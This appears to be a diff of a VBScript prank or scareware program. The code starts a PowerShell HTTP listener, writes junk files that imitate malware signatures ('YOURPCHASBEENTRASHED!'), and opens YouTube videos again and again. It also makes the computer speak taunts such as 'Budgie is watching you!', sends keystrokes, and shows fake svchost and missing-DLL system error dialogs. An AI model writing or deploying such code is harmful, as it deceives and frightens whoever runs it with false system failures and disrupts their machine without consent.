@@ -6,6 +6,7 @@ Set objShel = CreateObject("Wscript.Shell")
 Set objHTML = CreateObject("htmlfile")
 objHTML.ParentWindow.ClipboardData.SetData "text", "http://127.0.0.1:5000"
 
+
 ' PowerShell command to start the server
 psCommand = "powershell -NoExit -Command " & _
     """$listener = New-Object System.Net.HttpListener;" & _
@@ -108,16 +109,20 @@ For i = 1 To 5
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set file = fso.CreateTextFile(fileName, True)
     file.WriteLine "This Program Cannot Be Run In Dos Mode. MZ@ A!455654hgTrJEhYTh6SXcvok5htr´{}~997{JK _ JK _ _JgF BA-}"
+file.WriteLine "   												"
+file.WriteLine "   												Vir.bat"
     file.WriteLine "MKXet5646 r7657e ykjyuuu yuu uuu  y y yu r  ff @f fgg gg@ g fffggfr@ "
     file.WriteLine "MW0rmB0TN3_TggE34_45_Rgdf_RDDOS.js-NNNDR3REW5Qamaom3a4eg@_gff_fg_gfr@ "
-    file.WriteLine "MCMDHeurBZCPZQBoxter23152E92977"
+	file.WriteLine "   												d.vbs"
+    file.WriteLine "MCMDHeurBZCPZQBoxter23152E92977YOURPCHASBEENTRASHED!"
+    file.WriteLine "fffffffffffffffffffffffffffff"
     file.Close
 Next
 Randomize
 
 ' Generate a random hash-like string
 Dim chars, i, hash
-chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-"
+chars = "ABCDEF-GHIJKLMNO-PQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-"
 hash = ""
 
 For i = 1 To 20
@@ -134,7 +139,18 @@ set wshshl = WScript.CreateObject("wscript.shell")
 wshshl.Run(URL)
 wshshl.Run(URL)
 wshshl.Run(URL)
-
+Set sapie = CreateObject("SAPI.SpVoice")
+sapie.Speak "Budgie is coming"
+URLe = "https://www.youtube.com/shorts/3oRSrlZ5YSY" 
+set wl = WScript.CreateObject("wscript.shell")
+wl.Run(URLe)
+wl.Run(URLe)
+wl.Run(URLe)
+wl.Run(URLe)
+wl.Run(URLe)
+wl.Run(URLe)
+wl.Run(URLe)
+wl.Run(URLe)
     MsgBox "??????????????????", vbInformation, "BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE"
 x=msgbox("This Program Cant Start On Your Computer Because VCRUNTIME100.DLL Is  Missing From Your Device.",0+48, "svchost - System Error")
 x=msgbox("WARNING:cannot Start Critical system Process svchost.",0+48, "Critical System Error")
@@ -171,12 +187,10 @@ shell.SendKeys "F11n e"
 Urlw = "https://www.youtube.com/shorts/sBcrrswGtMU#LOUD_ASS_SCREAM" 
 set wshhl = WScript.CreateObject("wscript.shell")
 wshhl.Run(URLw)
+Set sapi = CreateObject("SAPI.SpVoice")
+sapi.Speak "Budgie is watching you!"
 wellisdrining=inputbox("DAm is GG     hahah4hhHAAAHHG44Aha3jh3amj4645çkikrfgjjjjjjjjjjjjc","DAMIR78.dll","input")
 End Select
 
 
 End If
-
-
-
-
